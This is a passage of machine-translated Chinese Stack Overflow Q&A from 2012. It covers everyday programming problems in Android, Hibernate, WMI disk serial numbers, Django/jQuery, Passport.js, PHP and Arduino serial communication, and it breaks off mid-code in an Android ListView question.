标头是要发送的第一件事。如果您打印文本然后发送标题，它将显示类似的错误。删除或注释标题部分以查看是否正在打印错误

# android - Android：启动子活动后访问应用程序资源

> ID：10989328
> 
> 赞同：0
> 
> 时间：2012-06-12T00:57:22.880
> 
> 标签：android, resources

我有一个在某些情况下启动子 Activity 的 android 应用程序。应用程序和活动都在我的控制之下 - 我为两者编写了源代码，并将应用程序/活动的资源放在主 android 应用程序 res 文件夹中。

我注意到的是，我的任何班级都没有资源可用于儿童活动。子活动类与主应用程序位于不同的类包中。

我的应用程序/子活动在技术上都是一个应用程序的一部分，那么为什么我不能访问子活动类中的资源？

有任何想法吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T01:04:51.013

你需要确保你没有导入 android.R，如果你已经删除它并且`import <the main package name>.r`

所以在我的应用程序中，我的主包被称为

```
nz.thsmartlemon.test1 
```

我的第二个是

```
nz.thesmartlemon.test2 
```

在我想做的所有活动中`import nz.thesmartlemon.test1.R`

* * *

当您尝试引用尚未生成的 R 文件时，Eclipse 喜欢自动执行此操作。

# java - 直接休眠地图成员的字段，无需设置器/获取器

> ID：10989334
> 
> 赞同：1
> 
> 时间：2012-06-12T00:58:10.647
> 
> 标签：java, hibernate, orm

我有这些简化的类型：

```
public class DataBean extends ZZZZZ {
    public String   name;
}

public class Member extends CCCCC {
    public DataBean m_data;
} 
```

我想映射`m_data`。`name`直接在`Member`. 我不能在两者之间使用任何类型的继承（已经被占用了！）。

这**将是理想的**：

```
<property name="m_data.name" column="name" type="string" access="field" /> 
```

任何的想法？Hibernate可以吗？

目前我收到此错误：

> org.hibernate.PropertyNotFoundException：在 com.example.Member 上找不到字段 [m_data.name]

主要原因是我试图（重新）使用从http服务获取的数据bean，我真的不想重写所有字段，也不想编写setter/getter。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T01:22:43.947

该`name`属性实际上在`DataBean`类中。所以，你得到的例外是显而易见的。因为映射是针对`Member`.

`DataBean`嵌入并映射嵌入类中的`Member`字段，您必须使用该`<component>`元素。

请在 SO 中参考此问题的答案：[Hibernate @embeddable annotation 等效于 XML 映射文件？](https://stackoverflow.com/q/4753941/738746)

答案还有一个指向页面的链接，该页面解释了嵌入对象是如何映射它们的。

**更新：**

```
<component
        name="m_data"
        class="com.example.DemoBean"
        access="field">
    <property name="name" column="NAME" type="string" access="field" />
</component> 
```

# c# - WMI 硬盘序列号转置

> ID：10989338
> 
> 赞同：6
> 
> 时间：2012-06-12T00:58:53.440
> 
> 标签：c#, wmi, transpose, serial-number

我有一些代码可以从 WMI 获取硬盘序列号。

```
SelectQuery selectQuery = new SelectQuery("Win32_PhysicalMedia");
ManagementObjectSearcher searcher =
             new ManagementObjectSearcher(selectQuery);
foreach (ManagementObject wmi_PM in searcher.Get())
{
      string str = wmi_PM["SerialNumber"];
} 
```

起初我认为它正在工作并检索到正确的序列号。在尝试使用它进行比较之后，我发现 WMI 报告的数字并不完全正确。WMI 序列号用一堆空格填充，并且字符被调换。

打印在贴纸上并由某些工具（可能使用 DeviceIoControl）返回的实际驱动器序列号是“3RH8B1BG”，但 WMI 返回“R38H1BGB”。

真实序列号：3RH8B1BG
WMI 序列号：R38H1BGB

一些工具，如 SiSoftware Sandra，返回这个填充和转置的数字，但它不是实际的序列号。如果您每隔一个位置调换一次，WMI 值就是序列号。这是正常的吗？我应该只编码以将其转换为正确的值吗？

我尽量避免使用 WMI，但现在似乎在网上搜索如何做某事都会带回 WMI 示例。

不同制造商的2个不同硬盘驱动器的WMI值序列号都被调换了，因此它不是一个磁盘。

更新：使用 DeviceIoControl 找到了一些代码

     [http://addressof.com/blog/archive/2004/02/14/392.aspx](http://addressof.com/blog/archive/2004/02/14/392.aspx)

令人惊讶的是，DeviceIoControl 也返回了一个转置的序列号。在上面 CorySmith 的代码中，它有一个 SwapChars 函数

```
Private Shared Function SwapChars(ByVal chars() As Char) As String
  For i As Integer = 0 To chars.Length - 2 Step 2
    chars.Reverse(chars, i, 2)
  Next
  Return New String(chars).Trim
End Function 
```

他提到的 c++ 代码有翻转到：

```
 //  function to decode the serial numbers of IDE hard drives
    //  using the IOCTL_STORAGE_QUERY_PROPERTY command 
char * flipAndCodeBytes (const char * str,
             int pos,
             int flip,
             char * buf)
{
    ...
} 
```

猜这是 DeviceIoControl 和 WMI 的标准，不敢相信我遇到的任何其他解决方案或示例都没有这个。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-03-08T13:16:40.597

找到了一个可行的解决方案来解码真正的 HD-Serials。以下链接包含即使没有管理员权限也可以解码的代码：[解码源](http://www.vbdotnetforums.com/vb-net-general-discussion/53323-getting-real-hard-disk-serial-number-normal-user-admin.html)

但是，如果您从 Vista 之上的 Win32_PhysicalMedia WMI 类中获得 Serials，则它可能并非在所有情况下都有效。然后你必须使用 Win32_DiskDrive 类（根据这个链接：[Jiliang Ge's Answer from Tuesday, October 27, 2009 3:12 AM](https://social.msdn.microsoft.com/Forums/vstudio/en-US/8523d7b9-0dc8-4d87-be69-a482aec9ee5e/wmi-win32physicalmedia-smart-id-in-vista-and-7-permissions?forum=netfxbcl)

我添加了代码（在 VB 中，因为我通常在 VB.NET 中编写代码）。我不想窃取别人的代码。我在代码中包含了尽可能多的信息和一些指向原始编码器的链接。它现在还包括从可移动驱动器中解码序列号（在同一例程中）。

希望能帮助到你。

```
 ''' <summary>
''' Decode Manufacuter Disk Serialnumbers (also for PNP USB-Drives)
''' </summary>
''' <param name="InterfaceType">InterfaceType from Win32_DiskDrive WMI-Class</param>
''' <param name="PNPDeviceID">PNPDeviceID from Win32_DiskDrive WMI-Class</param>
''' <param name="strVolumeSerial">Raw Serialnumber to be decoded</param>
''' <returns>Decoded Serialnumber</returns>
''' <remarks></remarks>
Public Shared Function Decode_HD_Serial(ByVal InterfaceType As String,
                          ByVal PNPDeviceID As String,
                          ByVal strVolumeSerial As String) As String

    'HANDLE USB PNP Devices differently (Removable USB-Sticks)
    'see: http://www.experts-exchange.com/Programming/Languages/.NET/Q_24574066.html

    If InterfaceType = "USB" Then
        Dim splitDeviceId As String() = PNPDeviceID.Split("\"c)
        Dim arrayLen As Integer = splitDeviceId.Length - 1
        Dim serialArray As String() = splitDeviceId(arrayLen).Split("&"c)
        Return serialArray(0)
    Else
        'Link:https://social.msdn.microsoft.com/Forums/vstudio/en-US/8523d7b9-0dc8-4d87-be69-a482aec9ee5e/wmi-win32physicalmedia-smart-id-in-vista-and-7-permissions?forum=netfxbcl
        'After digging into the [Win32_PhysicalMedia] WMI class, I find that from Vista/Longhorn the 
        'class has been taken over by another class called [Win32_DiskDrive]. Thus, if all machines 
        'in your environment are Vista and above use the second class otherwise use the first one. 
        'Based on my tests, the class gives the unique form of serial number when you run the 
        'app as an admin or as a non-admin. 
        ' ---> IF System.Environment.OSVersion.Version.Major > 5 then its Vista or higher. USE WIN32_DiskDrive

        Dim strVolumeSerialDecoded As String = String.Empty
        'Remove all space characters ("20").
        'Example : 20202020205635424544434553 will be 5635424544434553.
        strVolumeSerial.Trim.Replace("20", "")
        'IF THE USER IS ADMINISTRATOR, THE strVolumeSerial STRING WILL ALREADY CONTAIN THE SERIAL NUMBER IN ASCII, AND NO CONVERSION IS REQUIRED (Microsoft bug ?),
        'BUT IF THE strVolumeSerial STRING IS A HEX STRING, CONVERT IT TO ASCII :
        If System.Text.RegularExpressions.Regex.IsMatch(strVolumeSerial, "^[a-fA-F0-9]+$") Then
            'Convert to ASCII. Example : 5635424544434553 will be converted to V5BEDCES.
            strVolumeSerial = HexDecode(strVolumeSerial)
            'Swap pairs of characters.
            'Example : V5BEDCES will be converted to 5VEBCDSE.
            Dim serialNumber2 As String = ""
            For i As Integer = 0 To strVolumeSerial.Length - 1 Step 2
                strVolumeSerialDecoded &= strVolumeSerial(i + 1)
                strVolumeSerialDecoded &= strVolumeSerial(i)
            Next
            'Return the serialnumber as ASCII string.
            Return strVolumeSerialDecoded.Trim
        Else 'If strVolumeSerial is ASCII, remove spaces and return the serialnumber string.
            Return strVolumeSerial.Trim
        End If
    End If
End Function

''' <summary>Decodes a HEX-string to an ASCII string.</summary>
''' <param name="strHEX">The HEX-string to decode.</param>
''' <returns>If succeeded, the decoded String, an empty String if failed.</returns>
Private Shared Function HexDecode(ByVal strHEX As String) As String
    Try
        Dim sb As StringBuilder = New StringBuilder
        For i As Integer = 0 To strHEX.Length - 1 Step 2
            sb.Append(Convert.ToChar(Convert.ToUInt32(strHEX.Substring(i, 2), 16)).ToString)
        Next
        Return sb.ToString
    Catch ex As Exception
        Return ""
    End Try
End Function 
```

# javascript - 在 django 中获取 javascript 数组

> ID：10989342
> 
> 赞同：5
> 
> 时间：2012-06-12T00:59:25.640
> 
> 标签：javascript, jquery, django, arrays

这是我的代码：

**网址.py：**

```
from django.conf.urls import patterns
from views import show,showpage

urlpatterns = patterns('',
                       (r'^$',showpage),
                       (r'^show/$',show),
) 
```

**视图.py**

```
from django.http import HttpResponse
def show(request):
  arr = reqeust.GET.get('arr','Nothing')
  print arr#**it's 'Nothing'**
  if arr == 'Nothing':
    msg = 'fail'
  else:
    msg = 'pass'
  return HttpResponse(msg)

def showpage(request):
  html = '''    <html>
<head>
<script language="javascript" type="text/javascript" src="/site_media/js/jquery-1.7.2.js"></script>
</head>
<body>
<input type="button" id="input_btn"/>
</body>
<script language="javascript" type="text/javascript">
$(function(){
  $("#input_btn").bind("click",function(){
    arr = [1,2,3,4,5,6]
    $.ajax({
      type:"GET",
      url:"/show/",
      data:{arr:arr},//**I want pass the arr to django**
      success:function(data){alert(data);},
      error:function(data){alert(data);}
    });
  });
})
</script>
</html>'''
  return HttpResponse(html) 
```

当我访问**localhost:8000**并单击按钮时，我在后端控制台中打印了“Nothing”，如您所知，我在前端收到消息“失败”

呃..任何人都可以解决这个问题，我想要代码（`arr = reqeust.GET.get('arr','Nothing')`）返回一个列表（`[1,2,3,4,5,6]`）或类似的东西

---------附加1------

当我单击 btn 时，我在控制台中得到了这个

**[12/Jun/2012 09:48:44] “GET /show/?arr%5B%5D=1&arr%5B%5D=2&arr%5B%5D=3&arr%5B%5D=4&arr%5B%5D=5&arr% 5B%5D=6 HTTP/1.1" 200 4**

---------追加2--------

我像这样修复了我的代码：

```
arr = request.GET.get('arr[]','Nothing') 
```

我得到了 6，这是 javascript 数组的最后一个，我怎样才能得到整个数组？

提前谢谢！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-12T02:07:12.233

jQuery 决定在字段名称中添加方括号，这很可能适应 PHP。Django 不需要它们，但无论如何。访问`request.GET['arr[]']`，`request.GET.getlist('arr[]')`而不是。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-12T02:31:13.113

您还可以设置：

```
$.ajaxSettings.traditional = true; 
```

这将使 jQuery 的行为符合与 Django 一起使用的实际 HTTP 标准。

当您自己不打算访问 request.GET 或 request.POST 时（即 ajax 发布表单），这是必需的。

绝对建议在*每个*django 项目中设置它。

# node.js - Passport.js 和 Mongoose.js 在登录时填充用户 - 丢失 req.user 上的填充字段

> ID：10989343
> 
> 赞同：8
> 
> 时间：2012-06-12T00:59:43.880
> 
> 标签：node.js, mongodb, mongoose, passport.js

使用 Mongoose.js，我的身份验证方法填充字段“companyRoles._company”，但当我尝试访问我的 req.user 对象中的相同填充字段时，填充的数据将恢复为公司参考 ID。

```
//Authentication 
UserSchema.static('authenticate', function(email, password, callback) {
  this.findOne({ email: email })
  .populate('companyRoles._company', ['name', '_id'])
    .run(function(err, user) {
      if (err) { return callback(err); }
      if (!user) { return callback(null, false); }
      user.verifyPassword(password, function(err, passwordCorrect) {
        if (err) { return callback(err); }
        if (!passwordCorrect) { return callback(null, false); }
        return callback(null, user);
      });
    });
});

//login post
app.post('/passportlogin', function(req, res, next) {
  passport.authenticate('local', function(err, user, info) {
    if (err) { return next(err) }
    if (!user) { return res.redirect('/passportlogin') }
    req.logIn(user, function(err) {
      if (err) { return next(err); }
      console.log('req User');
      console.log(req.user); 
      return res.redirect('/companies/' + user.companyRoles[0]._company._id);
    });
  })(req, res, next);
});

app.get('/companies/:cid', function(req, res){
    console.log('req.user in companies:cid');
    console.log(req.user);   
}); 
```

req.logIn 后，记录 req.user 显示 - companyRoles{_company: [Object]}

但是当我登录后重定向到 /companies/:id 路由时，它显示的是 id 而不是填充的 [object] - companyRoles{_company: 4fbe8b2513e90be8280001a5}

关于为什么该字段不保持填充的任何想法？谢谢。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-06-12T19:24:48.660

问题是我没有填充 passport.deserializeUser 函数中的字段，这是更新后的函数：

```
//deserialize
passport.deserializeUser(function(id, done) {
    User.findById(id)
    .populate('companyRoles._company', ['name', '_id'])
    .run(function (err, user) {
        done(err, user);
     });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T03:14:03.703

看起来`res.redirect`您正在尝试通过将对象连接到字符串来构造 URL。我怀疑这会产生你想要的结果。您希望 URL 是什么样的？

# html - 调整窗口大小时页眉页脚的固定宽度

> ID：10989348
> 
> 赞同：1
> 
> 时间：2012-06-12T01:00:32.310
> 
> 标签：html, css, header, footer

我将 html 和正文设置为宽度：100% 位置：绝对
和页眉，页脚宽度：100%。

所以当我调整窗口大小时，页眉页脚也会调整大小。如何使它们具有固定宽度，即窗口的最大宽度？？？特别是在调整大小后，页眉页脚不会一直向右延伸

非常感谢你的帮助

```
<pre>
    html, body {
    height: 100%;
    width: 100%;
    }

    body {   
        position: absolute;  
        font-family: Helvetica, Garamond, serif;  
        margin: 0 0 0 0;
    }

    #footer {
        position: relative;
        margin-top: -150px;
    }

    #header, #footer {
        margin: 0 0 0 0;
        width: 100%;
    }

    #header {
        height: 100px;
    }

</pre> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T05:10:57.110

您可以使用`min-width`属性来应用 div 所需的最小宽度...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T02:36:53.263

我有**3 个 jsFiddles**您可以查看，包括`Edit`和`Edit2` [**HERE**](https://stackoverflow.com/a/10973303/1195891)。

那是你要的吗？

# python - 无法使用 XCode 4.3/homebrew 编译 mysql-python

> ID：10989360
> 
> 赞同：1
> 
> 时间：2012-06-12T01:02:03.080
> 
> 标签：python, mysql, xcode, mysql-python, homebrew

刚刚安装了 XCode 4.3，现在无法安装 mysql-python 包。我使用 OS X Lion 10.7.4、XCode 4.3、自制软件，它们都是几个小时前安装的。使用自制的 python 2.7.3、mysql 5.5.25

这是输出：

```
(lukasz) ~ > pip install MySQL-python
Downloading/unpacking MySQL-python
Running setup.py egg_info for package MySQL-python

warning: no files found matching 'MANIFEST'
warning: no files found matching 'ChangeLog'
warning: no files found matching 'GPL'
Installing collected packages: MySQL-python
Running setup.py install for MySQL-python
building '_mysql' extension
/usr/bin/gcc-4.2 -fno-strict-aliasing -Os -w -pipe -march=native -Qunused-arguments -fwrapv -DNDEBUG -g -fwrapv -O3 -Wall -Wstrict-prototypes -Dversion_info=(1,2,3,'final',0) -D__version__=1.2.3 -I/usr/local/Cellar/mysql/5.5.25/include -I/usr/local/Cellar/python/2.7.3/include/python2.7 -c _mysql.c -o build/temp.macosx-10.4-x86_64-2.7/_mysql.o -Qunused-arguments -g
_mysql.c:1: error: bad value (native) for -march= switch
_mysql.c:1: error: bad value (native) for -mtune= switch
error: command '/usr/bin/gcc-4.2' failed with exit status 1
Complete output from command /usr/local/Cellar/python/2.7.3/bin/python -c "import setuptools;__file__='/Users/lukasz/build/MySQL-python/setup.py';exec(compile(open(__file__).read().replace('\r\n', '\n'), __file__, 'exec'))" install --single-version-externally-managed --record /var/folders/lv/p8rbhkk559x1337twh8flq0r0000gn/T/pip-Bvu67T-record/install-record.txt:
running install

running build

running build_py

copying MySQLdb/release.py -> build/lib.macosx-10.4-x86_64-2.7/MySQLdb

running build_ext

building '_mysql' extension

/usr/bin/gcc-4.2 -fno-strict-aliasing -Os -w -pipe -march=native -Qunused-arguments -fwrapv -DNDEBUG -g -fwrapv -O3 -Wall -Wstrict-prototypes -Dversion_info=(1,2,3,'final',0) -D__version__=1.2.3 -I/usr/local/Cellar/mysql/5.5.25/include -I/usr/local/Cellar/python/2.7.3/include/python2.7 -c _mysql.c -o build/temp.macosx-10.4-x86_64-2.7/_mysql.o -Qunused-arguments -g

_mysql.c:1: error: bad value (native) for -march= switch

_mysql.c:1: error: bad value (native) for -mtune= switch

error: command '/usr/bin/gcc-4.2' failed with exit status 1

----------------------------------------
Command /usr/local/Cellar/python/2.7.3/bin/python -c "import setuptools;__file__='/Users/lukasz/build/MySQL-python/setup.py';exec(compile(open(__file__).read().replace('\r\n', '\n'), __file__, 'exec'))" install --single-version-externally-managed --record /var/folders/lv/p8rbhkk559x1337twh8flq0r0000gn/T/pip-Bvu67T-record/install-record.txt failed with error code 1 in /Users/lukasz/build/MySQL-python
Storing complete log in /Users/lukasz/.pip/pip.log
(lukasz) ~ > 
```

Mysql 安装了 homebrew 没有问题：

```
(lukasz) ~ > brew info mysql
mysql 5.5.25
http://dev.mysql.com/doc/refman/5.5/en/
Depends on: cmake, readline, pidof
/usr/local/Cellar/mysql/5.5.25 (6382 files, 222M) *
fatal: Not a git repository (or any of the parent directories): .git
https://github.com//homebrew/commits/master/Library/Formula/mysql.rb 
```

有没有办法手动更改*游行*标志？

更新：

哦，我还安装了*命令行工具*（Xcode -> Preferences -> Downloads），它显然为*gcc-4.2*创建了链接：

```
(lukasz) ~ > which gcc-4.2
/usr/bin/gcc-4.2
(lukasz) ~ > ls -l `which gcc-4.2`
lrwxr-xr-x  1 root  wheel  12 12 Jun 01:36 /usr/bin/gcc-4.2 -> /usr/bin/gcc
(lukasz) ~ > gcc-4.2 --version
i686-apple-darwin11-llvm-gcc-4.2 (GCC) 4.2.1 (Based on Apple Inc. build 5658) (LLVM build 2336.9.00)
... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T08:03:40.230

这可能有点跑题了，但是如果最后你编译不了 MySQL-python，你可以试试[PyMySQL](http://www.pymysql.org/)，它是纯 python mysql 客户端，可以直接替代 MySQL-python。它的工作速度非常快。

# c# - win 应用程序运行时无法使用网站

> ID：10989361
> 
> 赞同：0
> 
> 时间：2012-06-12T01:02:03.610
> 
> 标签：c#, vb.net, visual-studio-2010, visual-studio

我有一个使用本地网站数据库的 Windows 应用程序。(VS 2010 Express Edition) Win 应用程序运行时网站无法使用。

**错误消息**：无法打开用户默认数据库。登录失败。用户“NT AUTHORITY\SYSTEM”登录失败。 **说明**：执行当前 Web 请求期间发生未处理的异常。请查看堆栈跟踪以获取有关错误及其源自代码的位置的更多信息。 **异常详细信息**：System.Data.SqlClient.SqlException：无法打开用户默认数据库。登录失败。用户“NT AUTHORITY\SYSTEM”登录失败。

为什么？我怎样才能解决这个问题？谢谢。

# php - 读取最新创建的文件 php

> ID：10989362
> 
> 赞同：3
> 
> 时间：2012-06-12T01:02:21.473
> 
> 标签：php, file

我知道如何在 PHP 中读取文件，但我想读取在特定文件夹中创建的最新文件。

我有一个 html 按钮指向`read.php`

read.php 读取文件夹`c:\file\` 并读取在该文件夹中创建的最新文件。

我找不到太多有关如何执行此操作的信息

任何人都可以帮我这样做。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-06-12T01:12:35.110

获取最新文件`C:\file`：

```
$files = glob('c:/file/*.*');
$files = array_combine($files, array_map('filectime', $files));
arsort($files);
echo key($files); // the filename 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T01:11:08.753

遍历目录，跟踪最近创建的文件，在每一个都被遍历和检查后返回最新的。

```
$dir = "C:\file\";
if ($handle = opendir($dir)) {
    $latest = null;
    while (($cur = readdir($handle) !== false) {
        if ($latest == null || filectime($cur) > filectime($latest)) {
            $latest = $cur;
        }
    }
    closedir($handle);
}
return $latest; 
```

注意：大多数 Unix 操作系统不跟踪文件创建日期，因此您可以获得的最接近的是上次修改日期（通过`filemtime`或`filectime`）。但是，在 Windows 上，`filectime`返回创建日期，并`filemtime`返回最后修改日期。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T01:17:28.893

这将遍历目录中的每个文件并确定哪个文件具有最新的“创建时间”：

```
function find_latest()
{
    $l = 0;
    $r = '';
    foreach( new DirectoryIterator('C:\\file') as $file )
    {
        $ctime = $file->getCTime();    // Time file was created
        $fname = $file->getFileName(); // File name
        if( $ctime > $l )
        {
            $l = $ctime;
            $r = $fname;
        }
    }
    return $r;
} 
```

# serial-port - Arduino可以通过串行传输空字符吗？

> ID：10989364
> 
> 赞同：2
> 
> 时间：2012-06-12T01:02:33.010
> 
> 标签：serial-port, arduino

我将通过内置的硬件串行库在两个 Arduino 之间建立二进制驱动的串行通信。由于我的数据包是以二进制格式构造的，因此对于具有 0 值的整数实例，数据包中的几个字符很可能是空字符。我不确定 Arduinos 将如何处理空字符，或者根本不知道。在我继续我的项目之前，我当然想知道。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2020-01-04T20:04:52.967

二进制数据可以使用`write()`以下形式的方法传输：

`Serial.write(buf, len)`

在哪里...

buf：作为一系列字节发送的数组。
len：要从数组发送的字节数。

以这种方式传输所有指定的字符，包括空字符。否则，如果只是将缓冲区参数传递给方法，它会将参数视为字符串并在遇到第一个空字符时停止传输。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T01:10:57.953

是的。用于讨论“二进制数据”和字节的[Arduino 文档。`write()`](http://arduino.cc/en/Serial/Write)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-12T01:12:24.017

回到未来！

是的，标准 UART 串​​行可以很好地处理二进制文件。确保您在串行线的每一端的 UART（通用异步接收/发送）设备上配置了一个停止位，并且您应该已准备就绪。

根据我的经验，这种事情需要一定的时间才能做到正确。如果您将两个 UART 设置为 8 位、一位停止位、无奇偶校验和相同的位/秒速率，那么您应该很好。

如果您真的感到困惑，您可以尝试将串行线的一端连接到 PC 上的终端仿真器。Van Dyke Software 的 SecureCRT 有 30 天的免费试用期，可以处理普通串行。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-04-05T13:49:23.347

我发现通过软件串行发送以下 uart 数据包的相同问题：a[10]={0x12,0x32,0x30,0x00,0x00,0x00,0x00,0x00,0x00,0x14} mySerial.write(a) 将仅发送 0x12,0x32 ,0x30 并且不会发送空字符。为了解决这个问题，我必须使用 mySerial.write((byte)0) 发送空字符。因此，Arduino 串行库仅在单独发送空字符时才发送空字符：P

# c# - 表格无法正确显示

> ID：10989375
> 
> 赞同：1
> 
> 时间：2012-06-12T01:03:47.720
> 
> 标签：c#, visual-studio-2010, visual-studio

我在使用 Visual Studio 2010 时遇到了一个相当奇怪的问题。出于某种原因，每当我调试或构建我的程序时，我的“MainForm”都会像在第二张图片中一样出现，但应该看起来像设计器中的表单一样第一张图片（由于某种原因，设计器中会显示正确的表单，但编译时不会显示）

![图 1](../Images/693f7dd51eadc6a2df422d520e267268.png)

![图 2](../Images/ac28c5f648ebe094bb73bd8229c21c35.png)

我检查了`.Visible`所有控件上的选项，以及属性对话框中显示的启动选项`program.cs`，它们都是正确的。这是`program.cs`：

```
namespace SouthWest
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            //-----DO NOT EDIT-----
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new MainForm());
            //---------------------
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T02:42:11.140

首先，将其重新添加到 MainForm.cs：

```
public MainForm()
{
    InitializeComponent();
} 
```

然后，前往`Build > Clean and then Build > Rebuild`

每次在表单的构造函数中确保`InitializeComponent()`方法存在。

此方法初始化您的组件，即表单中的控件（因此命名为`InitializeComponent`），以便为它们分配内存（如果添加了事件处理程序，则会将它们添加到它们）。

# unit-testing - 你如何让 Pax Exam 使用 OBR 来处理传递依赖？

> ID：10989376
> 
> 赞同：1
> 
> 时间：2012-06-12T01:03:49.423
> 
> 标签：unit-testing, osgi, apache-karaf, pax-exam

在 Karaf 中，我可以安装 OBR 功能并使用 obr:addUrl 添加一个 repository.xml 和 obr:deploy 来部署一个包以及所有传递依赖项。我已经在[https://stackoverflow.com/a/10989017/242042中记录了它](https://stackoverflow.com/a/10989017/242042)

但是，现在我想使用 PaxExam 创建一个 JUnit 测试，但我似乎无法模仿我在 PaxExam 上使用 Karaf 所做的事情。

是否有任何代码片段可以显示如何指向 OBR 存储库并在自动完成所有传递计算的情况下进行部署？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T19:36:33.617

您可以使用 Pax URL [obr: 协议处理程序](http://team.ops4j.org/wiki/display/paxurl/Obr+Protocol)在 Pax Exam 测试中从 OBR 存储库提供单个包，但这不会引入任何传递依赖项。

在 Pax Exam 中，您始终需要自行配置每个捆绑包。但是您可以按复合选项对捆绑包进行分组，以支持测试配置的重用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-15T03:37:23.907

实际上，我不久前就找到了答案。我不使用 obr: 协议处理程序，而是实际上使用了 OBR 实现（Apache Aries）。

这就是我配置测试用例的方式

```
@Configuration
public static Option[] configuration() throws Exception {
    return options(
            systemProperty("org.ops4j.pax.logging.DefaultServiceLog.level")
                    .value("WARN"),
            frameworkProperty("obr.repository.url").value(
                    new File("target/dependency/repository.xml").toURI()
                            .toASCIIString()),
            bundle("mvn:org.apache.felix/org.osgi.service.obr/1.0.2"),
            bundle("mvn:org.apache.felix/org.apache.felix.bundlerepository/1.6.6"),
            bundle("mvn:org.apache.aries/org.apache.aries.util/0.4"),
            bundle("mvn:org.apache.aries.proxy/org.apache.aries.proxy/0.4"),
            junitBundles());
} 
```

然后，我在类中有一个方便的方法，可以使用 OBR 搜索字符串从 OBR 部署

```
private void obrDeploy(final String filter) throws Exception {
    final Resolver resolver = repositoryAdmin.resolver();
    final Resource[] discoverResources = repositoryAdmin
            .discoverResources(filter);
    for (final Resource r : discoverResources) {
        resolver.add(r);
    }
    assertTrue(resolver.resolve());
    resolver.deploy(true);
} 
```

然后我的测试用例看起来像这样。这可确保测试加载正确公开的服务。

```
@Test
public void testBlueprintBundle() throws Exception {
    obrDeploy("(symbolicname=net.trajano.maven-jee6.blueprint.producer)");
    getService(bundleContext, MongoDbFactory.class);
    getService(bundleContext, BlockingQueue.class);
    getService(bundleContext, Executor.class);
} 
```

请注意，这仅部署具有设计传递链接的捆绑包。如果您有其他不存在的依赖项，例如实现包，那么也需要部署它们。下面显示了如何使用通配符从 OBR 部署多个捆绑包以简化测试。

```
obrDeploy("(|(symbolicname=*.blueprint.consumer)(symbolicname=*.blueprint.producer)(symbolicname=*.hello.osgi))"); 
```

完整源代码在[https://github.com/trajano/maven-jee6/blob/emerging-technologies/osgi-sample/assembly/src/test/java/net/trajano/osgi/test/PaxTest.java](https://github.com/trajano/maven-jee6/blob/emerging-technologies/osgi-sample/assembly/src/test/java/net/trajano/osgi/test/PaxTest.java)

# php - PHP EXIF 数据不显示

> ID：10989387
> 
> 赞同：0
> 
> 时间：2012-06-12T01:07:30.940
> 
> 标签：php, image, metadata, exif

我一直在尝试从一张没有运气的照片中显示一些基本的 EXIF 数据。我的代码如下。我只需要显示一些基本信息。我在服务器上启用了 EXIF，并且我知道该图像中有 EXIF 数据 - 但此设置没有显示任何数据。谁能告诉我我在这里做错了什么？

```
$exif_data = exif_read_data("http://www.findexif.com/client/samples/swiss_house.jpg");

        $emake = $exif_data['Make'];
        $emodel = $exif_data['Model'];
        $eexposuretime = $exif_data['ExposureTime'];
        $efnumber = $exif_data['FNumber'];
        $eiso = $exif_data['ISOSpeedRatings'];
        $edate = $exif_data['DateTime'];

    echo "Make: ". $emake . "<br>";
        echo "Model: ". $emodel . "<br>";
        echo "Exp: ". $eexposuretime . "<br>";
        echo "Date: ". $edate . "<br>";
        echo "ISO: ". $eiso . "<br>"; 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-12T01:09:35.907

的文件名`exif_read_data`不能是 URL。

如果还想读取外部图片的EXIF数据，需要先下载：

```
<?php
$imageURL = 'http://www.findexif.com/client/samples/swiss_house.jpg';
$localURL = '/tmp/swiss_house.jpeg';

// Use 'copy' function if you have PHP5
//  and the HTTP stream wrapper enabled on your server.
copy($imageURL, $localURL);

/**
 * This way if you don't have PHP5
$fp = fopen($localURL, 'w');
fwrite($fp, file_get_contents($imageURL));
fclose($fp);
 */

$exif_data = exif_read_data($localURL);

$emake = $exif_data['Make'];
$emodel = $exif_data['Model'];
$eexposuretime = $exif_data['ExposureTime'];
$efnumber = $exif_data['FNumber'];
$eiso = $exif_data['ISOSpeedRatings'];
$edate = $exif_data['DateTime'];

echo 'Make: '. $emake . '<br>';
echo 'Model: '. $emodel . '<br>';
echo 'Exp: '. $eexposuretime . '<br>';
echo 'Date: '. $edate . '<br>';
echo 'ISO: '. $eiso . '<br>'; 
```

# android - 以编程方式创建 ListView

> ID：10989390
> 
> 赞同：5
> 
> 时间：2012-06-12T01:08:01.263
> 
> 标签：android, listview

Android初学者在这里。我正在玩 ListViews，试图动态创建它们而不是 XML 文件。我在我的代码中观察到以下奇怪的行为。

```
public class SettingsHolder extends Activity {

@Override
public void onCreate(Bundle savedInstanceState){
    super.onCreate(savedInstanceState);
    LinearLayout ll = new LinearLayout(this);
    ListView lv = new ListView(this);
    String[] values = new String[10];
    for(int i=0;i<10;i++){
        values[i] = ""+i;
    }
    ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, R.layout.list_item, values);
    lv.setAdapter(adapter);
    lv.setOnItemClickListener(new OnItemClickListener(){

        @Override
